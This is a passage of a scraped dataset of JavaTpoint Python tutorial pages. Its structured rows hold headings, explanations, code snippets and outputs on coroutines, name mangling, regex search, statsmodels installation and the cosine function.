25, 31, 43, 37, 29, 39, 23', '# Defining multiple values from multival() function', 'j, k, l, m, n, o, p, q = multival()', '# Printing multiple values in single statement', 'print(j, k, l, m, n, o, p, q)', '# A default function to check anagram word logic', 'def CheckAnagram(mkr1, mkr2):', 'return sorted(mkr1) == sorted(mkr2) # logic', '# Checking anagram words with default function', 'print(""Words are anagrams: "", CheckAnagram(\'Python\', \'yPotnh\'))', 'print(""Words are anagrams: "", CheckAnagram(\'JavaTpoint\', \'poijTtavaG\'))', '# Importing counter from collection module', 'from collections import Counter', '# A default function to check anagram word logic', 'def CheckAnagram(mkr1, mkr2):', 'return Counter(mkr1) == Counter(mkr2)  # logic', '# Checking anagram words with default function', 'print(""Words are anagrams: "", CheckAnagram(\'Python\', \'yPotnh\'))', 'print(""Words are anagrams: "", CheckAnagram(\'JavaTpoint\', \'poijTtavaG\'))']","['Hello Python Developers! Welcome to JavaTpoint', 'Occurrence of JavaTpoint:  5', 'Occurrence of Hello:  0', 'Occurrence of Python:  8', 'Occurrence of Welcome:  3', ""<module 'socket' from 'C:\\\\Users\\\\Manish\\\\lib\\\\socket.py'>"", ""<module 'numpy' from 'C:\\\\Users\\\\Manish\\\\lib\\\\site-packages\\\\numpy\\\\__init__.py'>"", ""<module 'os' from 'C:\\\\Users\\\\Manish\\\\lib\\\\os.py'>"", 'Most occurred element in the given list:  29', 'Given string for n number of times:', 'Welcome to JavaTpoint, Python developers!Welcome to JavaTpoint, Python developers!Welcome to JavaTpoint, Python developers!Welcome to JavaTpoint, Python developers!', 'm before swapping:  24', 'n before swapping:  26', 'm after swapping:  26', 'n after swapping:  24', 'True', 'False', 'Given string in program:  Welcome to JavaTpoint Python Developers!', 'Reverse of Given string in program is: !srepoleveD nohtyP tniopTavaJ to emocleW', '24 25 31 43 37 29 39 23', 'Words are anagrams:  True', 'Words are anagrams:  False', 'Words are anagrams:  True', 'Words are anagrams:  False']",[],[]
254,['Python Coroutines'],"['In this tutorial, we are going to learn about coroutine in Python. We will discuss the coroutines, subroutine, execution of coroutines, and closing of coroutine in Python in details. ']","['https://www.javatpoint.com/double-underscores-in-python', 'https://www.javatpoint.com/python-important-tips-and-tricks', 'https://www.javatpoint.com/double-underscores-in-python', 'https://www.javatpoint.com/python-important-tips-and-tricks', 'https://www.javatpoint.com/double-underscores-in-python']","['https://static.javatpoint.com/python/images/python-coroutines.png', 'https://static.javatpoint.com/python/images/python-coroutines2.png']",[],"['Python subroutines', 'What are Coroutines?', 'Coroutines in Python', 'Creating Pipeline Structure by Chaining Coroutine']","['Difference between Coroutines and Subroutines', 'Execution of Coroutines', 'Closing Coroutine']",[],"['Main Function', 'Now, in this section, we will talk about coroutines that are basically a generalization of subroutines.', 'Example: Assignment of yield on the right side, i.e., LineOfCode = (yield)', 'Explanation -', 'Understand the following program of coroutine with pipeline structure.', 'Explanation -']","['Before we start learning about coroutine, we must have a basic understanding of subroutines in Python. So, we will start with the Python subroutine in this tutorial.', 'As we all are known with functions in Python, we may or may not know that these Python functions are also known as a procedure, subprocess, or subroutines.', 'We call subroutines by the main function in Python that is responsible for the coordination while using subroutines in a function. All subroutines in Python have only a single entry point, i.e., starting of the main function.', 'After seeing the figure given above, we can easily conclude that the main function is required to coordinate between the subroutines while using them, and the main function is also the only entry point for subroutines in Python.', 'In Python having versions higher than 2.5, we can observe a slight change introduced in the yield statement of coroutines, and after this change, the yield statement can be used as an expression.', 'Any value that we send to the coroutine in the program will be captured by the coroutine and return only through the yield expression. We can send a value to coroutine only by the send() function.', ""Consider the given coroutines in the below program that will print out names only that have 'Officer' in their prefix and we will send the names to coroutines using the send() function."", 'In Python, the execution of coroutine is very similar to generators. Nothing will happen when we call the coroutine in the program; it will only run to the following two responses: send() and next() function.', 'We can clearly observe in the above example; coroutine starts executing only after we called the _next_() method in the program. After the coroutine is called, the execution advances to yield the first expression.', 'To close coroutine, we have to use the close() function in the program. When we close the coroutine, it will produce an exception, i.e., GeneratorExit exception that we can catch in a normal way of catching the exception.', 'We have to remember that if we try to send values to coroutine objects after closing the coroutine, the program will raise a StopIteration exception in the output.', 'We have to give an initial source, i.e., producer, that will derive the complete pipeline structure. Generally, producers are not a coroutine in itself, and they are just a simple method.', 'We have to create a sink at the end of the pipeline, and the sink will act as the endpoint of the pipeline. The sink is the point in the coroutine pipeline, which might collect all the input data and displays it.', ""That's how we can use the pipeline created with multiple coroutines and filtering the input data. The filtered or resultant data will be displayed at the sink of the pipeline, as we can see in the above output.""]","[""Generally, a function in Python is a packed sequence of instructions that work as a unit to perform a certain task in the code. When we divide the complex function's logic into several steps that are self-contained and work like a unique function (nested functions etc.), then these helpers or nested functions in the main function are called subroutines in Python."", 'Coroutines are generally used for cooperative multitasking of a process that is voluntarily giving away (yield) control over a period of time (periodically). A coroutine is also used when idle to enable the running of multiple applications simultaneously.', 'Coroutines are different from the thread as in coroutines; it is the programmer and the programming language that decides when coroutines are to be switched, whereas in the case of threads, the operating system schedule the switching between threads.', 'Coroutines are very similar to generators present in Python but coroutines come with a few modifications in the yield (give away) statement and some extra methods given in it. Python coroutines also able to consume the input data, whereas the generators were only able to produce data for iteration in function.', 'So, as we can see in the above program that we have taken three names from the user as input data, we have sent the user input data to the coroutine defined in the function by send() method. We have used the ""Officer"" keyword in coroutine to search the names that have officer prefix in their name, and coroutine will only print these matched names only as we can see in the output.', 'After that, the execution of the coroutine pauses and waits for the value to send to the coroutine object. After the first value is sent to the coroutine object, it checks if the required prefix is present, and if it is, then the object will print the name with the prefix. And after printing the name, it goes through a continuous loop till it encounters, name = (yield) expression again.', 'We can use coroutine to create a pipe structure. After we chain together the coroutine, we can push the given data through the created pipe structure using the push() method. To create a pipe structure in the program with coroutines, we have to take care of the following things:']","['# Default function to search prefix', 'def print_name(prfx):', 'print(""Coroutine object searching for the prefix: {}"".format(prfx)) # Searching for prefix', 'while True:', 'GivenName = (yield)', 'if prfx in GivenName: # If required prefix match', 'print(GivenName) # Print  given name', 'CorouteObject = print_name(""Officer"") # Taking prefix = Officer for coroutine object', '# Taking names as input from user', 'Name1 = input(""Enter first name: "")', 'Name2 = input(""Enter second name: "")', 'Name3 = input(""Enter third name: "")', 'CorouteObject.__next__() # using _next_() method to call coroutine', '# sending input data to coroutine with send() method', 'CorouteObject.send(Name1)', 'CorouteObject.send(Name2)', 'CorouteObject.send(Name3)', '# Default function to search prefix', 'def print_name(prfx):', 'print(""Coroutine object searching for the prefix: {}"".format(prfx)) # Searching for prefix', '# Using excption handling by try and except', 'try:', 'while True:', 'GivenName = (yield)', 'if prfx in GivenName: # If required prefix match', 'print(GivenName) # Print given name', 'except GeneratorExit: # Handling GeneratorExit exception', 'print(""Now we have closed the coroutine!!"")', 'CorouteObject = print_name(""Officer"") # Taking preifx = Officer for coroutine object', 'CorouteObject.__next__() # using _next_() method', '# sending input data to coroutine with send() method', 'CorouteObject.send(""Alexa"")', 'CorouteObject.send(""Officer Tony Stark"")', 'CorouteObject.send(""Officer Steve Rogers"")', '# closing the coroutine', 'CorouteObject.close()', '# Defining producer for the pipeline', 'def producer(GivenSentence, NextCoroutine):', 'tokens = GivenSentence.split("" "") # splitting sentence', 'for token in tokens: # iterating over tokens', 'NextCoroutine.send(token)', 'NextCoroutine.close() # closing coroutine', '# Defining pattern filter for the pipeline structure', 'def pattern_filter(SearchPattern = ""ing"", NextCoroutine = None):', 'print(""In the input sentence, we are searching for words that end with{}"".format(SearchPattern)) # Searching for pattern', 'try:', 'while True:', 'token = (yield) # yielding tokens', 'if SearchPattern in token:', 'NextCoroutine.send(token) # Sending tokens', 'except GeneratorExit: # Exception handling for GeneratorExit exception', 'print(""We are done with filtering the given input sentence!!"")', '# Defining sink for the pipeline', 'def print_token():', 'print(""I\'m sink in the pipeline and I am used to print the tokens given."")', 'try:', 'while True:', 'token = (yield) # yielding tokens', 'print(token) # printing the tokens from sink', 'except GeneratorExit:', 'print(""Now we are done with printing!"")', '# Taking sink variable', 'PrintToken = print_token()', 'PrintToken.__next__() # calling sink', '# Taking Pattern filter variable', 'PatternFilter = pattern_filter(NextCoroutine = PrintToken)', 'PatternFilter.__next__() # calling pattern filter', '# Taking a sentence for the producer in the pipeline', 'GivenSentence = ""Steve rogers is running very fast to chase down a train moving with high speed""', 'producer(GivenSentence, PatternFilter) # calling producer']","['Enter first name: Alex', 'Enter second name: Officer Steve Rogers', 'Enter third name: Officer Natasha Widow', 'Coroutine object searching for the prefix: Officer', 'Officer Steve Rogers', 'Officer Natasha Widow', 'Coroutine object searching for the prefix: Officer', 'Officer Tony Stark', 'Officer Steve Rogers', 'Now we have closed the coroutine!!', ""I'm sink in the pipeline, and I am used to printing the tokens given."", 'In the input sentence, we are searching for words that end with ing', 'running', 'moving', 'We are done with filtering the given input sentence!!']","[""Coroutines|||Subroutines&&&Unlike subroutines, Coroutines have multiple entry points.|||Subroutines have only a single entry point, i.e., the main function.&&&We can only suspend and resume the execution of Python subroutines from a single point, and it can only be resumed only from the starting point.|||We can suspend and resume the execution of coroutines in Python from multiple points in the function, and also, we can resume execution from where we have suspended it last.&&&Unlike subroutines, we don't have any main function for Python coroutines to order and coordinate their execution particularly.|||In Python subroutines, the main function coordinates between the multiple subroutines and controls their executions.&&&Coroutines are corporative as they together form a pipeline structure while we are executing them.|||Subroutines form a linear execution structure.&&&In Coroutines, we have a coroutine that displays the result for input data.|||For subroutines, the processing result of data given in them is displayed by the main function.""]",[]
255,['Double Underscores in Python'],"['In the following tutorial, we will discuss the Double Underscores and its use in the Python programming language. But before we get to that, let us briefly discuss some aspects of the underscore as well.']","['https://www.javatpoint.com/re-search-vs-re-findall-in-python-regex', 'https://www.javatpoint.com/python-coroutines', 'https://www.javatpoint.com/re-search-vs-re-findall-in-python-regex', 'https://www.javatpoint.com/python-coroutines', 'https://www.javatpoint.com/re-search-vs-re-findall-in-python-regex']",[],[],"['Understanding the Python Underscore', 'Understanding Double-leading Underscore', 'Understanding Double-leading and trailing Underscore']",[],[],"['The underscore (_) character conveys different meanings in different conditions.', 'There are several uses of Underscore (_) that are stated below:', 'However, we will only be covering the naming conventions used with double underscores only.', 'These naming conventions are classified into two types:', ""Thus, let's get started."", 'Double-leading underscore is utilized for the mangling of the name.', 'The syntax for the Double-leading Underscore is shown below:', 'Name Mangling: Python interpreter alters the name of the variable in a technique that is challenging to clatter during the inheritance of the class.', 'Let us consider an example based on this functionality.', 'Example: 1', 'Explanation:', 'As a result, the above code block returns every attribute of the class object. Now, let us observe the variables in the list of attributes.', 'The variable self.first appears in the list without any alterations.', 'The variable self._second also appears in the list without any alterations.', 'However, we can observe some alterations in the case of the variable self.__third.', 'Explanation:', 'Let us consider another example in order to print that element with the help of a modified Attribute.', 'Example: 2', 'Explanation:', 'We can access the Double-leading Underscore variables with the help of methods in the class. Let us consider an example based on this functionality.', 'Example: 3', 'Explanation:', 'We can also utilize the Double-leading Underscore for the method names. Let us consider an example based on this functionality.', 'Example: 4', 'Explanation:', 'Let us consider the following example:', 'Example: 5', 'Explanation:', 'The syntax for the Double-leading and trailing Underscore is shown below:', 'Let us consider an example based on the magic methods.', 'Explanation:']","['Double-leading underscore tells the interpreter of Python to rewrite the name of the attribute of subclasses in order to avoid any conflicts in naming.', 'In the above snippet of code, we have defined a class as mySample() and used the initializing function to declare some values. We have then instantiated the class using the myObj object. At last, we have printed the directory of the object.', 'If we observe the list of attributes, we will notice an attribute known as _mySample__third. This is the case of name mangling. It happens to avoid the overriding of the variable in subclasses.', 'In the above snippet of code, we can observe that we have used the ""_AnotherClass__third"" variable instead of the ""__third"" variable to access the variable\'s value.', 'In the above snippet of code, we have defined a function followed by the double-leading underscore within a class. We have then defined another function to call the from that function and printed the result for the user.', 'Now, let us understand another way of name mangling. First of all, we will declare a variable with the name _myClass__myVar, and we will attempt to access that variable using the Double-leading Underscore name.', 'In a Programming language like Python, we will discover various names which begin and end with the double underscore. These naming conventions are known as Magic methods or Dunder methods.']","['The character underscore (_) is not simple in Python. There are many languages that use the underscores to name the functions and variables in the snake case only; however, Python has a much more important use of it. Most probably, most of us might be familiar with the following syntax:', 'In the above snippet of code, we have defined a class as mySample() and used the initializing function to declare some variables. We have then defined a child class for the mySample() class, where we used the super() function to inherit the variables from the parent class and overrode them. At last, we have instantiated the child class and print the values of overrode variables.', 'As a result, the messages of the first two variables are printed successfully; however, the program raised an exception in the case of the ""__third"" variable. This happens due to the name mangling, which changed the myObj.__third to _AnotherClass__third.', 'In the above snippet of code, we defined a class and used the initializing function to declare a variable. We have then defined a method to return the value of the variable. At last, we have instantiated the class and print the value of the variable using both ways. As a result, the program returns the ""Welcome"" statement while printing the method. However, it also raised an exception for another method as it alters the name of the variable.', 'In the above snippet of code, we have declared a variable and defined a class. We have then defined a function to return the value of the declared variable. At last, we have instantiated the class and called the function to print the value of that variable.', 'In the above snippet of code, we have defined a class. We have defined a magic method as the __init__() function within the class, also known as initializing function. We have then declared the variable as __num__. At last, we have instantiated the class and print the value of the variable. As a result, this program works and yields a required output. However, it is not a good practice to use magic methods as the names of the variables as this will lead us to clashes. Thus, it is better to stay away from them.']","['# defining a class', 'class mySample():', '# using the __init__() function', 'def __init__(self):', 'self.first = 10', 'self._second = 15', 'self.__third = 20', '# instantiating the class', 'myObj = mySample()', '# printing the directory of the object', 'print(dir(myObj))', '# defining a class', 'class mySample():', '# using the __init__() function', 'def __init__(self):', 'self.first = 10', 'self._second = 15', 'self.__third = 20', '# defining a child class', 'class AnotherClass(mySample):', 'def __init__(self):', 'super().__init__()', 'self.first = ""Variable Overridden""', 'self._second = ""Variable Overridden""', 'self.__third = ""Variable Overridden""', '# instantiating the child class', 'myobj = AnotherClass()', '# printing the values of variables', 'print(myobj.first)', 'print(myobj._second)', 'print(myobj.__third)', '# defining a class', 'class mySample():', '# using the __init__() function', 'def __init__(self):', 'self.first = 10', 'self._second = 15', 'self.__third = 20', '# defining a child class', 'class AnotherClass(mySample):', 'def __init__(self):', 'super().__init__()', 'self.first = ""Variable Overridden""', 'self._second = ""Variable Overridden""', 'self.__third = ""Variable Overridden""', '# instantiating the child class', 'myobj = AnotherClass()', '# printing the value(s) of variable(s)', 'print(myobj._AnotherClass__third)', '# defining the class', 'class myClass:', '# initializing function', 'def __init__(self):', 'self.__myVar = ""Welcome""', '# defining another method to return the variable', 'def get_Var(self):', 'return self.__myVar', '# instantiating the class', 'myObj = myClass()', '# it returns the ""Welcome"" which is a __var', 'print(myObj.get_Var())', ""# here, an error is raised as stated before. It alters the variable's name"", 'print(myObj.__myVar)', '# defining a class', 'class myClass:', '# defining a double-leading underscore function', 'def __myfunction(self):', 'return ""Welcome""', '# defining a function to call the above function', 'def call_function(self):', 'return self.__myfunction()', '# instantiating the class', 'myObj = myClass()', '# printing the value within the function', 'print(myObj.call_function())', '# raised an error', 'print(myObj.__myfunction())', '# declaring a variable', '_myClass__myVar = ""Welcome""', '# defining a class', 'class myClass:', '# defining a function to return the declared variable', 'def call_function(self):', 'return __myVar', '# instantiating the class', 'myObj = myClass()', '# printing the value of the variable', 'print(myObj.call_function())', '__var__', '# defining a class', 'class myClass:', '# using a magic method', 'def __init__(self):', '# using a magic method as variable name', 'self.__myNum__ = 10', '# instantiating the class', 'myObj = myClass()', '# printing the value of the variable', 'print(myObj.__myNum__)']","[""['__class__',"", ""'__delattr__',"", ""'__dict__',"", ""'__dir__',"", ""'__doc__',"", ""'__eq__',"", ""'__format__',"", ""'__ge__',"", ""'__getattribute__',"", ""'__gt__',"", ""'__hash__',"", ""'__init__',"", ""'__init_subclass__',"", ""'__le__',"", ""'__lt__',"", ""'__module__',"", ""'__ne__',"", ""'__new__',"", ""'__reduce__',"", ""'__reduce_ex__',"", ""'__repr__',"", ""'__setattr__',"", ""'__sizeof__',"", ""'__str__',"", ""'__subclasshook__',"", ""'__weakref__',"", ""'_mySample__third',"", ""'_second',"", ""'first']"", 'Variable Overridden', 'Variable Overridden', 'Traceback (most recent call last):', 'File ""D:\\Python\\ternarypy.py"", line 24, in', 'print(myobj.__third)', ""AttributeError: 'AnotherClass' object has no attribute '__third'"", 'Variable Overridden', 'Welcome', 'Traceback (most recent call last):', 'File ""D:\\Python\\ternarypy.py"", line 15, in', 'print(myObj.__myVar)', ""AttributeError: 'myClass' object has no attribute '__myVar'"", 'Welcome', 'Traceback (most recent call last):', 'File ""D:\\Python\\ternarypy.py"", line 14, in', 'print(myObj.__myfunction())', ""AttributeError: 'myClass' object has no attribute '__myfunction'"", 'Welcome', '10']",[],['|||for _ in range(20)|||__init__(self)|||_ = 10||||||Using the Underscore in interpreter|||Using the Underscore to ignore values|||Using the Underscore in loops|||Using the Underscore to separate digits of numbers|||Using the Underscore for naming purpose||||||Double-leading Underscore: __var|||Double-leading and trailing Underscore: __var__|||']
256,['re.search() vs re.findall() in Python Regex'],"['The regular expression, also known as rational expression, is the sequence of characters used for defining the search pattern. It mostly uses for pattern matching with strings or string matching such as find and replace operations. Regular expressions are the generalized way for matching patterns with sequences of characters.']","['https://www.javatpoint.com/how-to-install-statsmodels-in-python', 'https://www.javatpoint.com/double-underscores-in-python', 'https://www.javatpoint.com/how-to-install-statsmodels-in-python', 'https://www.javatpoint.com/double-underscores-in-python', 'https://www.javatpoint.com/how-to-install-statsmodels-in-python']",[],[],"['The re.search() method', 'The re.findall() method', 'Conclusion']",[],[],"['There are 14 MetaCharacters, and we will discuss them as they follow into the functions:', 'Explanation:', 'match.group(0) will always return the fully matched string of data,', 'Explanation:', 'In this tutorial, we have discussed the difference between the re.search() method and the re.findall() method in Python regex, with examples.']","['Module Regular Expressions (RE) is used for specifying the set of strings that matches the pattern. For understanding the RE analogy, the MetaCharacters are used in functions of the re module.', 'In the above code, we have imported the re module  and used the regular expression for matching the string of data with the pattern, that is Weekday and Date of Today.']","['The re.search() method is used for returning None ( in case the pattern does not match), or re.MatchObject which contains all the information about the matching parts of the string. This method stops functioning after the first match, so this is perfectly suited for testing the Regular expression more than extracting the data.', 'The expression ""([A-Za-z]+) (\\d+)"" should match the string of data imported. It will then print the [25, 35] as it matches the string at the 25th index and ends as the 35th index number. We have used the group() function for getting all the matches and captured groups for getting the required output in pattern. These groups contain the matched values. Such as:', 'match.group(1) and match.group(2) will return the capture groups in the order of left to right in the input string. The (match.group() also means match.group(0)). If the data string matches the pattern, it will print in the right sequence; otherwise, it will go for else statement.', 'The re.findall() method is used for getting all the non-overlapping matches of the pattern in the string of data as return, in the form of the list of strings. The string of data will be scanned from left to right, and its matches will be returned in the same order as found.', 'In the above code, we first import the string of text which contains some digits. Then we set the regular expression ""(\\d+)"" for matching the string with the pattern. The match will be non-overlapping data in the text string. After importing the re.findall() method, we get the non-overlapping matched data of the string as output.']","['\\ :  It is used for dropping the special meaning of character following it', '[] : It is used for representing a character class', '^ : It is used for matching the beginning', '$ :  It is used for matching the end', '. : It is used for matching any character except newline', '? : It is used for matching zero or one occurrence.', '| : It means OR. This is used for matching with any of the characters separated by it.', '* :  It is used for any number of occurrences (including 0 occurrences)', '+ :  It is used for one or more occurrences', '{} : It is used for indicating the number of occurrences of the preceding RE to match.', '() : It is used for enclosing the group of REs.', 'import re', '# We will use the regular expression for matching the string of data', ""# in the form of Weekday's name followed by day number"", 'regex = r""([A-Za-z]+) (\\d+)""', 'match = re.search(regex, ""Day and Date of Today is Tuesday 12"")', 'if match != None:', 'print (""The String match at index % s, % s"" % (match.start(), match.end()))', 'print (""Full match of Pattern: % s"" % (match.group(0)))', 'print (""The Weekday of Today is: % s"" % (match.group(1)))', 'print (""The Date of Today is: % s"" % (match.group(2)))', 'print (""The pattern of Python regex does not match with the string of Data imported."")', 'import re', '# The string of text where regular expression will be searched.', 'string_1 = """"""Here are some student\'s ID, student A: 676', 'student B: 564', 'student C: 567', 'student D: 112', 'student E: 234""""""', '# Setting the regular expression for finding digits in the string.', 'regex_1 = ""(\\d+)""', 'match_1 = re.findall(regex_1, string_1)', 'print(match_1)']","['The String match at index 25, 35', 'Full match of Pattern: Tuesday 12', 'The Weekday of Today is: Tuesday', 'The Date of Today is: 12', ""['676', '564', '567', '112', '234']""]",[],[]
257,['How to install statsmodels in Python?'],"['If you aspire for a flourishing career in the field of machine learning, let us introduce you to one more interesting package whose functionalities would leave you awestruck.']","['https://www.javatpoint.com/cos-in-python', 'https://www.javatpoint.com/re-search-vs-re-findall-in-python-regex', 'https://www.javatpoint.com/cos-in-python', 'https://www.javatpoint.com/re-search-vs-re-findall-in-python-regex', 'https://www.javatpoint.com/cos-in-python']","['https://static.javatpoint.com/python/images/how-to-install-statsmodels-in-python1.png', 'https://static.javatpoint.com/python/images/how-to-install-statsmodels-in-python2.png']",[],['Installation of statsmodels'],"['Installing statsmodels', 'Using PowerShell', 'Using Command Prompt', 'Checking the Version of Python in Linux']",[],"[""So, let's see what is statsmodels and what are its features?"", 'Some of the essential features of this package are-', ""Let's have a look at the steps of installing statsmodels in Python-"", 'Follow the below steps to check the version of Python using PowerShell.', ""Type 'Command Prompt' on the taskbar's search pane and you'll see its icon. Click on it to open the command prompt."", 'Also, you can directly click on its icon if it is pinned on the taskbar.', 'In Linux, we have a shell where we type our commands that are interpreted and tells the operating system about what the user wants.', 'The steps to check the version of Python in Linux is-', 'In the next line, it will display the current version of python installed in your system.', 'Now let us discuss the steps for installing statsmodels in our system. We will look at two methods of installation', 'In the first method, we will open the Anaconda Prompt and type the following command-', ""In the second method, we will open the Command Prompt, type the following command and click on 'Enter'."", ""It's time to look have a program in which we will import statsmodels-""]","['Statsmodels is a popular library in Python that enables us to estimate and analyze various statistical models. It is built on numeric and scientific libraries like NumPy and SciPy.', 'Here, we will perform OLS(Ordinary Least Squares) regression, in this technique we will try to minimize the net sum of squares of difference between the calculated value and observed value.', 'In this tutorial, we discussed what are the steps involved in installing statsmodels and how we can obtain a detailed statistical summary of our dataset with its aid.']",[],"['conda install -c conda-forge statsmodels', 'pip install statsmodels', 'import pandas as pd', 'import statsmodels.api as sm', 'df=pd.read_csv(""/content/SampleSuperstore.csv"")', 'df.head()', ""x=df['Sales']"", ""y=df['Profit']"", 'model=sm.OLS(y,x).fit()', 'model_summary=model.summary()', 'print(model_summary)']",[],[],"[""|||Using Powershell|||Using Command Prompt||||||Start your system and switch on to the Linux operating system (you might find it with the name Ubuntu).|||Once the desktop screen of Linux appears, click on 'Terminal' to open it.|||In the terminal window, type python -version and click on 'Enter'.|||&&&|||It includes various models of linear regression like ordinary least squares, generalized least squares, weighted least squares, etc.|||It provides some efficient functions for time series analysis.|||It also has some datasets for examples and testing.|||Models based on survival analysis are also available.|||All the statistical tests that we can imagine for data on a large scale are present.|||||||||Checking the version of Python installed in our PCs, we have discussed this already in the previous articles but let's talk about this again-|||There are two ways to check the version of Python in Windows-|||||||||Click 'Win+R' or type 'Run' on the taskbar's search pane.|||Type 'Powershell'|||A window will appear on your screen named 'Windows Powershell'|||Click on 'Enter'|||Type python -version and click on 'Enter'|||The version would be displayed in the next line.||||||Once the 'Command Prompt' screen is visible on your screen.|||Type python -version and click on 'Enter'.|||The version installed in your system would be displayed in the next line.||||||Using Anaconda Prompt|||Using Command Prompt|||""]"
258,['Cos in Python'],"[""In this tutorial, we are going to discuss the trigonometric cosine (cos) function in Python. We will talk about modules that we can use to implement the cos function in our Python program. We will also learn about plotting graphs using the cos function in the program. So, let's start by looking at the modules that we can import into the program to use the cos function.""]","['https://www.javatpoint.com/vif-in-python', 'https://www.javatpoint.com/how-to-install-statsmodels-in-python', 'https://www.javatpoint.com/vif-in-python', 'https://www.javatpoint.com/how-to-install-statsmodels-in-python', 'https://www.javatpoint.com/vif-in-python']","['https://static.javatpoint.com/python/images/cos-in-python.png', 'https://static.javatpoint.com/python/images/cos-in-python2.png']",[],['Python Modules for cos function'],"['Method 1: cos() function in the math module', 'Method 2: cos() function in Numpy module', 'Plotting Graphical representation for cosine value in the output']",[],"['Following is the syntax for using math.cos() function in the Python program:', 'Parameters: Here, parameter a = value in radian.', ""Return value: The math.cos() function returns the cosine value for the argument 'a' in radians that we have given inside the function."", ""Let's understand the use of cos() function of math module in Python through following example program:"", 'Following is the syntax for using numpy.cos() function in the Python program:', ""Parameters: We can give 'a' as following parameter types inside the numpy.cos() function:"", 'Return type: The numpy.cos() function will return the cosine values of the given number.', ""Let's understand the use of numpy module's cos() function in Python through following example program:"", ""Let's understand the implementation of both methods by using them in a Python program and plotting graphs with them in the output."", 'Example - 1: Directly importing and implementing cos() function and numpy & math module', 'Example - 2: Iterating over cos() function with numpy and math module']",[],"['In Python, we have a math module that we can use to import and implement cos function as well as other important mathematical operations in the program. Other than the math module, we can also use the numpy module of Python to implement the cos function in the program. We will learn the use of both modules, i.e., math module and numpy module, one after another, to implement the cos function in the program, respectively.', 'The math module of Python comes with a number of important mathematical values and operations, and the cos() function is one of them. We can use the cos() function of the math module to implement the trigonometric cos value in the program. The math.cos() function returns the trigonometric cosine value for the argument we give inside the function, i.e., the value of the degree in cosine. And, the value we are giving as the argument in the function should be in radians.', 'Other than the math module, we can also use the numpy module for the implementation of trigonometric cosine value in the program. For this, we are provided with a cos() function inside the numpy module that gives us math cosine value in the output. Like math.cos() function, while using cos() function of numpy module, we have to give argument value in radians inside the function.', 'We have learned the use of the cos() function of both numpy and math modules inside a Python program till now. Now, we will use both numpy and math modules, and with that, we will also use cos() function to plot a graphical representation of cosine values. We can do this graphical representation in the following two ways:']","['math.cos(a)', '# Import math module', 'import math', '# Define an input radian value', 'x = math.pi / 12', '# Printing cosine value for respective input value', 'print (""The cosine value of pi / 12 value as given is : "", end ="""")', 'print (math.cos(x))', 'numpy.cos(a)', '# importing numpy module as jtp in program', 'import numpy as jtp', '# defining multiple input values in a single array', 'ValArray = [0, jtp.pi / 4, jtp.pi / 7, jtp.pi/9, jtp.pi/12, jtp.pi/5]', '# printing input array in output', 'print (""Values given in the input array: \\n"", ValArray)', '# using cos() function to get cosine values', 'CosArray = jtp.cos(ValArray)', '# printing cos values in output', 'print (""\\nRespective Cosine values for input array values: \\n"", CosArray)', '# importing numpy module as jtp', 'import numpy as jtp', '# importing matplotlib module as mlt', 'import matplotlib.pyplot as mlt', '# Defining an array containing radian values', 'RadValArray = jtp.linspace(-(2*jtp.pi), 2*jtp.pi, 20)', '# cosine values for respective array value', 'CosValArray = jtp.cos(RadValArray)', '# printing values in output', 'print(""Radian values in the array: "", RadValArray)', 'print(""\\nRespective cos values of array: "", CosValArray)', '# using plot() function with variables', 'mlt.plot(RadValArray, CosValArray, color = \'blue\', marker = ""*"")', 'mlt.title(""Graphical representation of cos function"")', 'mlt.xlabel(""X-axis"")', 'mlt.ylabel(""Y-axis"")', '# plotting graph in output', 'mlt.show()', '# importing math module', 'import math', '# importing numpy module as jtp', 'import numpy as jtp', '# importing matplotlib module as mlt', 'import matplotlib.pyplot as mlt', '# Defining an array containing radian values', 'RadValArray = jtp.linspace(-(2*jtp.pi), 2*jtp.pi, 20)', '# Empty array for cosine values', 'CosValArray = []', '#Iterating over the cos values array', 'for j in range(len(RadValArray)):', 'CosValArray.append(math.cos(RadValArray[j]))', 'j += 1', '# printing respective values in output', 'print(""Radian values in the array: "", RadValArray)', 'print(""\\nRespective cos values of array: "", CosValArray)', '# using plot() function with variables', 'mlt.plot(RadValArray, CosValArray, color = \'orange\', marker = ""+"")', 'mlt.title(""Graphical representation of cos function"")', 'mlt.xlabel(""X-axis"")', 'mlt.ylabel(""Y-axis"")', '# plotting graph in output', 'mlt.show()']","['The cosine value of pi / 12 value as given is: 0.9659258262890683', 'Values given in the input array:', '[0, 0.7853981633974483, 0.4487989505128276, 0.3490658503988659, 0.2617993877991494, 0.6283185307179586]', 'Respective Cosine values for input array values:', '[1.         0.70710678 0.90096887 0.93969262 0.96592583 0.80901699]', 'Radian values in the array:  [-6.28318531 -5.62179738 -4.96040945 -4.29902153 -3.6376336  -2.97624567', '-2.31485774 -1.65346982 -0.99208189 -0.33069396  0.33069396  0.99208189', '1.65346982  2.31485774  2.97624567  3.6376336   4.29902153  4.96040945', '5.62179738  6.28318531]', 'Respective cos values of array:  [ 1.          0.78914051  0.24548549 -0.40169542 -0.87947375 -0.9863613', '-0.67728157 -0.08257935  0.54694816  0.94581724  0.94581724  0.54694816', '-0.08257935 -0.67728157 -0.9863613  -0.87947375 -0.40169542  0.24548549', '0.78914051  1.        ]', 'Radian values in the array:  [-6.28318531 -5.62179738 -4.96040945 -4.29902153 -3.6376336  -2.97624567', '-2.31485774 -1.65346982 -0.99208189 -0.33069396  0.33069396  0.99208189', '1.65346982  2.31485774  2.97624567  3.6376336   4.29902153  4.96040945', '5.62179738  6.28318531]', 'Respective cos values of array:  [1.0, 0.7891405093963934, 0.2454854871407988, -0.40169542465296987, -0.8794737512064891, -0.9863613034027223, -0.6772815716257412, -0.08257934547233249, 0.5469481581224268, 0.9458172417006346, 0.9458172417006346, 0.5469481581224268, -0.0825793454723316, -0.6772815716257405, -0.9863613034027223, -0.8794737512064893, -0.40169542465296987, 0.2454854871407988, 0.7891405093963934, 1.0]']",[],['|||We can give a single value argument in radians in the function.|||We can also give an array containing multiple radian values as an argument in the function.||||||Directly importing and implementing cos() function and numpy & math module|||Iterating over cos() function with numpy and math module|||']
